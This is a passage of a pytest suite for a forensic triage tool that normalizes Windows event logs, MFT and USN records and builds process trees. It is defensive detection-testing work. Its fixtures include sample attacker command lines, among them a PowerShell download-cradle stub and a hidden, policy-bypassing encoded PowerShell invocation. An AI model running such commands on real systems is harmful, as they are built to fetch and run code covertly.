            "parser": "scheduled_task_xml",
            "source_tool": "native_scheduled_task",
            "source_format": "xml",
        },
    )[0]
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["risk_score"] >= 60
    assert "hidden_task" in doc["tags"]
    assert "logon_trigger" in doc["tags"]
    assert "com_handler_task" in doc["tags"]
    assert any("invalid COM handler CLSID" in reason for reason in doc["suspicious_reasons"])
    assert "missing_command" in doc["data_quality"]


def test_invalid_timestamps_are_ignored() -> None:
    assert parse_timestamp("1601-01-01 00:00:00")[0] is None
    assert parse_timestamp("N/A")[0] is None


def test_generic_csv_normalization_adds_namespaces(tmp_path: Path) -> None:
    path = tmp_path / "PsList_From_Pslist.csv"
    path.write_text("Name,PID,PPid,CommandLine\npowershell.exe,123,1,powershell -enc aQ==\n", encoding="utf-8")
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "process", "name": path.name, "source_path": path.name, "parser": "generic_csv"})
    assert docs[0]["event"]["category"] == "execution"
    assert "suspicious_command" in docs[0]["tags"]
    assert {"os", "rule", "memory", "linux", "macos"}.issubset(docs[0].keys())


def test_evtx_normalization_uses_windows_mapping(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text("EventID,Channel,Provider,TargetUserName,LogonType,Message\n4624,Security,Microsoft-Windows-Security-Auditing,alex,10,Interactive logon\n", encoding="utf-8")
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})
    assert docs[0]["event"]["category"] == "authentication"
    assert docs[0]["event"]["type"] == "logon_success"
    assert "rdp" in docs[0]["tags"]


def test_mft_normalization_specific_fields(tmp_path: Path) -> None:
    path = tmp_path / "MFTECmd.csv"
    path.write_text(
        "EntryNumber,SequenceNumber,ParentEntryNumber,InUse,FileName,Extension,FileSize,Created0x10,Modified0x10,LastAccess0x10,LastRecordChange0x10,FullPath\n"
        "42,7,5,false,evil.ps1,.ps1,2048,2026-05-03T10:00:00Z,2026-05-03T10:01:00Z,2026-05-03T10:02:00Z,2026-05-03T10:03:00Z,C:\\Users\\Public\\evil.ps1\n",
        encoding="utf-8",
    )
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "mft", "name": path.name, "source_path": path.name, "parser": "zimmerman"})
    doc = docs[0]
    assert doc["artifact"]["type"] == "mft"
    assert doc["event"]["category"] == "file"
    assert doc["file"]["path"] == "C:\\Users\\Public\\evil.ps1"
    assert doc["file"]["directory"] is None
    assert doc["file"]["created"] == "2026-05-03T10:00:00+00:00"
    assert doc["file"]["modified"] == "2026-05-03T10:01:00+00:00"
    assert doc["mft"]["entry_number"] == "42"
    assert doc["mft"]["record_number"] == "42"
    assert doc["mft"]["parent_record_number"] == "5"
    assert doc["mft"]["created_time"] == "2026-05-03T10:00:00+00:00"
    assert doc["mft"]["modified_time"] == "2026-05-03T10:01:00+00:00"
    assert doc["mft"]["mft_modified_time"] == "2026-05-03T10:03:00+00:00"
    assert doc["mft"]["accessed_time"] == "2026-05-03T10:02:00+00:00"
    assert doc["file"]["deleted"] is True
    assert doc["event"]["type"] == "file_deleted"
    assert doc["user"]["name"] is None
    assert doc["key_entity"] == "C:\\Users\\Public\\evil.ps1"
    assert "C:\\Users\\Public\\evil.ps1" in doc["summary"]
    assert "file_deleted" in doc["summary"]
    assert doc["event"]["action"] == "mft_deleted_entry_observed"
    assert doc["event"]["message"] == "Deleted MFT entry observed: C:\\Users\\Public\\evil.ps1"
    assert doc["timestamp_precision"] == "mft_si_changed"


def test_mft_summary_scoring_prioritizes_case_iocs_and_user_writable_paths() -> None:
    score, reasons = score_mft_summary_row(
        {
            "FullPath": r"C:\Users\Public\psexec.exe",
            "FileName": "psexec.exe",
            "Extension": ".exe",
            "LastModified0x10": "2024-03-22 11:26:39",
        }
    )

    assert score >= 95
    assert "known_case_indicator" in reasons
    assert "suspicious_extension" in reasons
    assert "user_public_path" in reasons
    assert "incident_window" in reasons


def test_mft_summary_scoring_flags_deleted_scripts_in_temp() -> None:
    score, reasons = score_mft_summary_row(
        {
            "FullPath": r"C:\Users\alice\AppData\Local\Temp\script.ps1",
            "FileName": "script.ps1",
            "Extension": "ps1",
            "InUse": "False",
        }
    )

    assert score >= 95
    assert "known_case_indicator" in reasons
    assert "suspicious_extension" in reasons
    assert "appdata_path" in reasons
    assert "deleted_entry" in reasons


def test_mft_summary_selector_keeps_high_value_rows_before_generic_cap(tmp_path: Path) -> None:
    source = tmp_path / "MFTECmd_MFT_Summary.csv"
    selected = tmp_path / "MFTECmd_MFT_Summary_Selected.csv"
    source.write_text(
        "\n".join(
            [
                "EntryNumber,FileName,FullPath,Extension,InUse,LastModified0x10",
                r"1,ntdll.dll,C:\Windows\System32\ntdll.dll,.dll,True,2024-01-01 00:00:00",
                r"2,normal.txt,C:\Windows\System32\normal.txt,.txt,True,2024-01-01 00:00:00",
                r"3,script.ps1,C:\Users\Public\script.ps1,.ps1,True,2024-03-22 11:26:39",
                r"4,maintenance.ps1,C:\Users\alice\AppData\Local\Temp\maintenance.ps1,.ps1,True,2024-03-22 11:27:00",
                r"5,psexec.exe,C:\Users\Public\psexec.exe,.exe,True,2024-03-22 11:28:00",
            ]
        )
        + "\n",
        encoding="utf-8",
    )

    result = _select_high_value_csv_rows(source, selected, max_records=3)

    assert result["records_total"] == 5
    assert result["records_selected"] == 3
    assert result["source_hits"]["p_ps1"] == 1
    assert result["source_hits"]["update_ps1"] == 1
    assert result["source_hits"]["psexec"] == 1
    selected_text = selected.read_text(encoding="utf-8")
    assert "script.ps1" in selected_text
    assert "maintenance.ps1" in selected_text
    assert "psexec.exe" in selected_text
    assert "SummaryScore" in selected_text
    assert "SummaryReasons" in selected_text


def test_mft_full_preparer_keeps_all_rows_and_scores(tmp_path: Path) -> None:
    source = tmp_path / "MFTECmd_MFT_Summary.csv"
    selected = tmp_path / "MFTECmd_MFT_Full_Selected.csv"
    source.write_text(
        "\n".join(
            [
                "EntryNumber,FileName,FullPath,Extension,InUse,ResidentDataHex",
                r"1,normal.txt,C:\Windows\System32\normal.txt,.txt,True,abcdef",
                r"2,sample.iso,C:\Users\alice\Downloads\sample.iso,.iso,True,abcdef",
                r"3,psexec.exe,C:\Users\Public\psexec.exe,.exe,True,abcdef",
            ]
        )
        + "\n",
        encoding="utf-8",
    )

    result = _prepare_full_csv_rows(source, selected)

    assert result["records_total"] == 3
    assert result["records_selected"] == 3
    selected_text = selected.read_text(encoding="utf-8")
    assert "normal.txt" in selected_text
    assert "sample.iso" in selected_text
    assert "psexec.exe" in selected_text
    assert "SummaryScore" in selected_text
    assert "SummaryReasons" in selected_text
    assert "ResidentDataHex" not in selected_text


def test_mft_parent_path_builds_full_path(tmp_path: Path) -> None:
    path = tmp_path / "MFTECmd.csv"
    path.write_text(
        "EntryNumber,SequenceNumber,ParentEntryNumber,InUse,FileName,ParentPath\n"
        "42,7,5,true,evil.ps1,C:\\Users\\Public\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "mft", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["file"]["path"] == "C:\\Users\\Public/evil.ps1" or doc["file"]["path"] == "C:\\Users\\Public\\evil.ps1"
    assert doc["file"]["name"] == "evil.ps1"


def test_mft_placeholder_path_is_ignored(tmp_path: Path) -> None:
    path = tmp_path / "MFTECmd.csv"
    path.write_text("Path,FileName\n-,cmd.exe\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "mft", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["file"]["path"] == "cmd.exe"
    assert doc["file"]["name"] == "cmd.exe"


def test_mft_ads_and_timestomp_are_detected(tmp_path: Path) -> None:
    path = Path(__file__).parent / "fixtures" / "mftecmd_mft_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "mft", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    ads_doc = next(doc for doc in docs if doc["file"]["path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\runme.cmd")
    assert ads_doc["event"]["type"] == "alternate_data_stream"
    assert ads_doc["file"]["has_ads"] is True
    assert "Zone.Identifier" in ads_doc["file"]["ads"]
    assert "MFT alternate data stream observed" in ads_doc["suspicious_reasons"]
    assert "MFT Zone.Identifier observed" in ads_doc["suspicious_reasons"]
    mismatch_doc = next(doc for doc in docs if doc["file"]["name"] == "update.js")
    assert mismatch_doc["filesystem"]["timestomp_suspected"] is True
    assert "MFT timestamp anomaly" in mismatch_doc["suspicious_reasons"]
    assert "MFT possible timestomping" in mismatch_doc["suspicious_reasons"]


def test_mftecmd_usn_reason_classification(tmp_path: Path) -> None:
    path = Path(__file__).parent / "fixtures" / "mftecmd_usn_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "usn", "name": path.name, "source_path": str(path), "parser": "zimmerman"})
    create_doc = next(doc for doc in docs if doc["usn"]["reason"] == "FILE_CREATE")
    delete_doc = next(doc for doc in docs if doc["usn"]["reason"] == "FILE_DELETE")
    rename_new_doc = next(doc for doc in docs if doc["usn"]["reason"] == "RENAME_NEW_NAME")
    modified_doc = next(doc for doc in docs if doc["usn"]["reason"] == "DATA_EXTEND")
    assert create_doc["artifact"]["type"] == "usn"
    assert create_doc["event"]["type"] == "file_created"
    assert delete_doc["event"]["type"] == "file_deleted"
    assert rename_new_doc["event"]["type"] == "file_rename_new_name"
    assert modified_doc["event"]["type"] == "file_modified"
    assert "DATA_EXTEND" in modified_doc["search_text"]


def test_mftecmd_fixture_integration() -> None:
    mft_path = Path(__file__).parent / "fixtures" / "mftecmd_mft_sample.csv"
    usn_path = Path(__file__).parent / "fixtures" / "mftecmd_usn_sample.csv"
    mft_docs = normalize_file("case-1", "ev-1", "art-1", mft_path, {"artifact_type": "mft", "name": mft_path.name, "source_path": str(mft_path), "parser": "zimmerman"})
    usn_docs = normalize_file("case-1", "ev-1", "art-2", usn_path, {"artifact_type": "usn", "name": usn_path.name, "source_path": str(usn_path), "parser": "zimmerman"})
    assert any(doc["event"]["type"] == "file_observed" for doc in mft_docs)
    assert any(doc["event"]["type"] == "file_deleted" for doc in mft_docs)
    assert any("suspicious_path" in doc["tags"] for doc in mft_docs)
    assert any(doc["event"]["type"] == "file_created" for doc in usn_docs)
    assert any(doc["event"]["type"] == "file_deleted" for doc in usn_docs)
    assert any(doc["event"]["type"] == "file_rename_old_name" for doc in usn_docs)
    assert any(doc["raw"].get("FileName") == "payload.exe" for doc in usn_docs)


def test_mft_sprint_deleted_ads_startup_and_timestomp() -> None:
    deleted = normalize_row(
        "case-1",
        "ev-mft-1",
        "art-mft-1",
        {
            "ArtifactType": "mft",
            "EntryNumber": 123,
            "SequenceNumber": 4,
            "FullPath": r"C:\Users\dfir\Downloads\payload.exe",
            "FileName": "payload.exe",
            "IsDeleted": True,
            "InUse": False,
            "SI_Changed": "2026-05-15T10:07:00Z",
            "OwnerSid": "S-1-5-21-111-222-333-1001",
        },
        {"artifact_type": "mft", "parser": "mft_jsonl", "source_path": "mft_deleted_payload.jsonl", "name": "mft_deleted_payload.jsonl"},
    )
    startup = normalize_row(
        "case-1",
        "ev-mft-2",
        "art-mft-2",
        {
            "ArtifactType": "mft",
            "EntryNumber": 124,
            "SequenceNumber": 5,
            "FullPath": r"C:\Users\dfir\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runme.ps1",
            "FileName": "runme.ps1",
            "InUse": True,
            "SI_Changed": "2026-05-15T11:07:00Z",
        },
        {"artifact_type": "mft", "parser": "mft_jsonl", "source_path": "mft_startup_script.jsonl", "name": "mft_startup_script.jsonl"},
    )
    ads = normalize_row(
        "case-1",
        "ev-mft-3",
        "art-mft-3",
        {
            "ArtifactType": "mft",
            "EntryNumber": 125,
            "SequenceNumber": 6,
            "FullPath": r"C:\Users\dfir\Downloads\payload.exe",
            "FileName": "payload.exe",
            "HasAds": True,
            "AdsName": "Zone.Identifier",
            "AdsSize": 123,
            "SI_Changed": "2026-05-15T12:07:00Z",
        },
        {"artifact_type": "mft", "parser": "mft_jsonl", "source_path": "mft_zone_identifier.jsonl", "name": "mft_zone_identifier.jsonl"},
    )
    timestomp = normalize_row(
        "case-1",
        "ev-mft-4",
        "art-mft-4",
        {
            "ArtifactType": "mft",
            "EntryNumber": 126,
            "SequenceNumber": 7,
            "FullPath": r"C:\Users\dfir\AppData\Local\Temp\invoice.pdf.exe",
            "FileName": "invoice.pdf.exe",
            "SI_Created": "2026-05-15T10:00:00Z",
            "FN_Created": "2025-01-01T10:00:00Z",
            "SI_Changed": "2026-05-15T13:07:00Z",
        },
        {"artifact_type": "mft", "parser": "mft_jsonl", "source_path": "mft_timestomp.jsonl", "name": "mft_timestomp.jsonl"},
    )
    report = _build_mft_parse_report(
        [{"artifact_type": "mft", "parser": "mft_jsonl", "records_read": 4, "records_parsed": 4, "records_indexed": 4, "source_file": "mft_bundle.jsonl"}],
        [],
        [deleted, startup, ads, timestomp],
        selected_artifact_types=["mft"],
        scope="evidence",
    )
    sample = _build_mft_sample_events([deleted, startup, ads, timestomp])
    assert deleted["event"]["type"] == "file_deleted"
    assert deleted["file"]["deleted"] is True
    assert "MFT deleted executable" in deleted["suspicious_reasons"]
    assert "MFT deleted file in suspicious path" in deleted["suspicious_reasons"]
    assert deleted["risk_score"] >= 60
    assert startup["event"]["type"] == "file_observed"
    assert "MFT script in user-writable path" in startup["suspicious_reasons"]
    assert "MFT file in Startup folder" in startup["suspicious_reasons"]
    assert startup["risk_score"] >= 70
    assert ads["event"]["type"] == "alternate_data_stream"
    assert "MFT alternate data stream observed" in ads["suspicious_reasons"]
    assert "MFT Zone.Identifier observed" in ads["suspicious_reasons"]
    assert timestomp["timestamp_precision"] == "mft_si_changed"
    assert "MFT double extension" in timestomp["suspicious_reasons"]
    assert "MFT possible timestomping" in timestomp["suspicious_reasons"]
    assert "mft_timestamp_inconsistency" in timestomp["data_quality"]
    assert timestomp["risk_score"] >= 70
    assert deleted["execution"]["is_execution_confirmed"] is False
    assert report["records_indexed"] == 4
    assert report["deleted_count"] >= 1
    assert report["ads_count"] >= 1
    assert report["zone_identifier_count"] >= 1
    assert report["double_extension_count"] >= 1
    assert report["timestamp_anomaly_count"] >= 1
    assert len(sample) >= 4


def test_evtx_7045_is_persistence_not_logon(tmp_path: Path) -> None:
    path = tmp_path / "System-EvtxECmd.csv"
    path.write_text("EventID,Channel,Provider,ServiceName,ImagePath,Computer\n7045,System,Service Control Manager,MalSvc,C:\\ProgramData\\svc.exe,MOVISTAR-PC\n", encoding="utf-8")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["category"] == "persistence"
    assert doc["event"]["type"] == "service_created"
    assert doc["host"]["name"] == "movistar-pc"


def test_evtx_powershell_does_not_use_rendered_message_as_user(tmp_path: Path) -> None:
    path = tmp_path / "PowerShell-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,ScriptBlockText,RenderedMessage,UserId,Computer\n"
        '4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,"IEX (New-Object Net.WebClient).DownloadString()","Script block text: User=whoami, network, blah","S-1-5-18",MOVISTAR-PC\n',
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["category"] == "execution"
    assert doc["artifact"]["type"] == "powershell"
    assert doc["artifact"]["parser"] == "powershell_evtx"
    assert doc["user"]["name"] is None
    assert "User=whoami" not in str(doc["user"])


def test_evtx_4625_logon_failed(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventId,Channel,Provider,TargetUserName,TargetDomainName,IpAddress,LogonType,FailureReason,Status,SubStatus\n"
        "4625,Security,Microsoft-Windows-Security-Auditing,bob,CONTOSO,10.0.0.5,3,Bad password,0xc000006d,0xc000006a\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["event"]["type"] == "logon_failed"
    assert doc["event"]["category"] == "authentication"
    assert doc["source"]["ip"] == "10.0.0.5"
    assert doc["user"]["name"] == "bob"


def test_evtx_4688_process_creation_with_command_line(tmp_path: Path) -> None:
    path = tmp_path / "Security-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,NewProcessName,ProcessCommandLine,ParentProcessName,NewProcessId,CreatorProcessId,SubjectUserName,SubjectDomainName\n"
        '4688,Security,Microsoft-Windows-Security-Auditing,C:\\Windows\\System32\\cmd.exe,"cmd.exe /c whoami",C:\\Windows\\explorer.exe,0x123,0x100,alex,CONTOSO\n',
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["artifact"]["type"] == "process"
    assert doc["artifact"]["parser"] == "security_4688"
    assert doc["event"]["type"] == "process_start"
    assert doc["process"]["name"] == "cmd.exe"
    assert doc["process"]["command_line"] == "cmd.exe /c whoami"
    assert doc["process"]["parent_name"] == "explorer.exe"
    assert doc["execution"]["is_execution_confirmed"] is True


def test_process_graph_sysmon_simple_tree() -> None:
    events = [
        {
            "id": "evt-a",
            "event_id": "evt-a",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "A", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
        },
        {
            "id": "evt-b",
            "event_id": "evt-b",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "B", "parent_entity_id": "A", "parent_name": "explorer.exe", "pid": 200, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        },
        {
            "id": "evt-c",
            "event_id": "evt-c",
            "@timestamp": "2026-05-15T10:02:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "C", "parent_entity_id": "B", "parent_name": "powershell.exe", "pid": 300, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    assert graph["summary"]["nodes_count"] == 3
    assert graph["summary"]["edges_count"] == 2
    assert any(edge["source"] == "A" and edge["target"] == "B" and edge["confidence"] == "high" for edge in graph["edges"])
    assert any(edge["source"] == "B" and edge["target"] == "C" and edge["confidence"] == "high" for edge in graph["edges"])


def test_process_graph_security_4688_pid_inference() -> None:
    events = [
        {
            "id": "evt-parent",
            "event_id": "evt-parent",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:parent", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:child", "pid": 200, "parent_pid": 100, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    edge = next(edge for edge in graph["edges"] if edge["target"] == "security:child")
    child = next(node for node in graph["nodes"] if node["id"] == "security:child")
    assert edge["source"] == "security:parent"
    assert edge["confidence"] == "medium"
    assert "parent_inferred_by_pid" in child["data_quality"]


def test_process_graph_pid_reuse_ambiguity() -> None:
    events = [
        {
            "id": "evt-parent-1",
            "event_id": "evt-parent-1",
            "@timestamp": "2026-05-15T09:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:parent1", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
        },
        {
            "id": "evt-parent-2",
            "event_id": "evt-parent-2",
            "@timestamp": "2026-05-15T09:30:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:parent2", "pid": 100, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:child", "pid": 200, "parent_pid": 100, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    child = next(node for node in graph["nodes"] if node["id"] == "security:child")
    assert not any(edge["target"] == "security:child" for edge in graph["edges"])
    assert "possible_pid_reuse" in child["data_quality"]
    assert graph["summary"]["warnings_summary"]["ambiguous_parent_candidates"] == 1
    assert graph["summary"]["warnings_samples"] == ["Ambiguous parent candidates for node security:child"]
    assert graph["summary"]["warnings"][0] == "1 ambiguous parent candidates. Some edges were omitted to avoid incorrect parent-child links."
    assert "1 nodes were marked with possible PID reuse." in graph["summary"]["warnings"]


def test_process_graph_pid_candidates_are_disambiguated_by_parent_name() -> None:
    events = [
        {
            "id": "evt-parent-1",
            "event_id": "evt-parent-1",
            "@timestamp": "2026-05-15T09:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:parent1", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
        },
        {
            "id": "evt-parent-2",
            "event_id": "evt-parent-2",
            "@timestamp": "2026-05-15T09:30:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {"entity_id": "security:parent2", "pid": 100, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "process": {
                "entity_id": "security:child",
                "pid": 200,
                "parent_pid": 100,
                "parent_name": "cmd.exe",
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            },
        },
    ]
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    edge = next(edge for edge in graph["edges"] if edge["target"] == "security:child")
    child = next(node for node in graph["nodes"] if node["id"] == "security:child")
    assert edge["source"] == "security:parent2"
    assert edge["confidence"] == "medium"
    assert "parent_inferred_by_pid" in child["data_quality"]
    assert "possible_pid_reuse" not in child["data_quality"]


def test_process_graph_aggregates_ambiguous_parent_warnings() -> None:
    events: list[dict] = []
    for index in range(12):
        events.append(
            {
                "id": f"evt-parent-a-{index}",
                "event_id": f"evt-parent-a-{index}",
                "@timestamp": f"2026-05-15T09:{index:02d}:00Z",
                "artifact": {"type": "process", "parser": "security_4688"},
                "event": {"type": "process_start"},
                "host": {"name": "desktop-1"},
                "process": {"entity_id": f"parent-a-{index}", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
            }
        )
        events.append(
            {
                "id": f"evt-parent-b-{index}",
                "event_id": f"evt-parent-b-{index}",
                "@timestamp": f"2026-05-15T09:{index:02d}:30Z",
                "artifact": {"type": "process", "parser": "security_4688"},
                "event": {"type": "process_start"},
                "host": {"name": "desktop-1"},
                "process": {"entity_id": f"parent-b-{index}", "pid": 100, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe"},
            }
        )
        events.append(
            {
                "id": f"evt-child-{index}",
                "event_id": f"evt-child-{index}",
                "@timestamp": f"2026-05-15T10:{index:02d}:00Z",
                "artifact": {"type": "process", "parser": "security_4688"},
                "event": {"type": "process_start"},
                "host": {"name": "desktop-1"},
                "process": {"entity_id": f"child-{index}", "pid": 200 + index, "parent_pid": 100, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            }
        )
    graph = _build_process_graph(events, "case-1", "ev-1", "evidence")
    summary = graph["summary"]
    assert summary["warnings_summary"]["ambiguous_parent_candidates"] == 12
    assert len(summary["warnings_samples"]) == 10
    assert summary["warnings"][0] == "12 ambiguous parent candidates. Some edges were omitted to avoid incorrect parent-child links."


def test_build_process_tree_bundle_keeps_summary_coherent_with_filtered_graph(monkeypatch: pytest.MonkeyPatch) -> None:
    events = [
        {
            "id": "evt-a",
            "event_id": "evt-a",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "movistar-pc"},
            "process": {"entity_id": "A", "pid": 100, "name": "winword.exe", "path": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"},
        },
        {
            "id": "evt-b",
            "event_id": "evt-b",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "movistar-pc"},
            "process": {
                "entity_id": "B",
                "parent_entity_id": "A",
                "parent_name": "winword.exe",
                "pid": 200,
                "name": "powershell.exe",
                "path": "C:\\Users\\alex\\Downloads\\payload.exe",
                "command_line": "powershell.exe -EncodedCommand AAAA",
            },
        },
        {
            "id": "evt-c",
            "event_id": "evt-c",
            "@timestamp": "2026-05-15T10:02:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start"},
            "host": {"name": "movistar-pc"},
            "process": {"entity_id": "C", "parent_entity_id": "B", "parent_name": "powershell.exe", "pid": 300, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe"},
        },
    ]
    monkeypatch.setattr("app.services.debug_export._search_scope_events", lambda context, size, extra_filters=None: (events, len(events), {}))
    case = Case(id="case-1", name="Case 1")
    evidence = Evidence(
        id="ev-1",
        case_id="case-1",
        original_filename="movistar.zip",
        stored_path="/tmp/movistar.zip",
        evidence_type=EvidenceType.unknown,
        sha256="abc",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    bundle = build_process_tree_bundle(case, [evidence], scope="case", host="movistar-pc")
    graph = bundle["graph"]
    assert graph["summary"]["nodes_count"] == len(graph["nodes"]) == 3
    assert graph["summary"]["edges_count"] == len(graph["edges"]) == 2
    assert graph["summary"]["suspicious_chains_count"] == len(bundle["sample_chains"]) == 1


def test_process_graph_encoded_powershell_and_enrichment() -> None:
    process_event = {
        "id": "evt-1",
        "event_id": "evt-1",
        "@timestamp": "2026-05-15T10:00:00Z",
        "artifact": {"type": "process", "parser": "security_4688"},
        "event": {"type": "process_start"},
        "host": {"name": "desktop-1"},
        "process": {
            "entity_id": "security:ps",
            "pid": 200,
            "name": "powershell.exe",
            "path": "C:\\Users\\dfir\\Downloads\\payload.exe",
            "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA",
            "parent_name": "winword.exe",
        },
    }
    browser_download = {
        "id": "evt-b",
        "event_id": "evt-b",
        "@timestamp": "2026-05-15T09:59:00Z",
        "artifact": {"type": "browser", "parser": "browser_csv"},
        "event": {"type": "file_downloaded"},
        "download": {"target_path": "C:\\Users\\dfir\\Downloads\\payload.exe"},
    }
    defender_detection = {
        "id": "evt-d",
        "event_id": "evt-d",
        "@timestamp": "2026-05-15T10:01:00Z",
        "artifact": {"type": "detection", "parser": "defender_evtx"},
        "event": {"type": "malware_detected"},
        "detection": {"path": "C:\\Users\\dfir\\Downloads\\payload.exe"},
    }
    graph = _build_process_graph([process_event, browser_download, defender_detection], "case-1", "ev-1", "evidence")
    node = next(node for node in graph["nodes"] if node["id"] == "security:ps")
    assert node["risk_score"] >= 90
    assert "encoded_command" in node["badges"]
    assert "Process uses encoded PowerShell" in node["risk_reasons"]
    assert "Process uses execution policy bypass" in node["risk_reasons"]
    assert "Process hidden window" in node["risk_reasons"]
    assert "Process associated with browser download" in node["risk_reasons"]
    assert "Process associated with Defender detection" in node["risk_reasons"]


def test_process_graph_report_and_sample_chains() -> None:
    events = [
        {
            "id": "evt-parent",
            "event_id": "evt-parent",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "parent", "pid": 100, "name": "winword.exe", "path": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"},
        },
        {
            "id": "evt-child",
            "event_id": "evt-child",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "security_4688"},
            "event": {"type": "process_start"},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
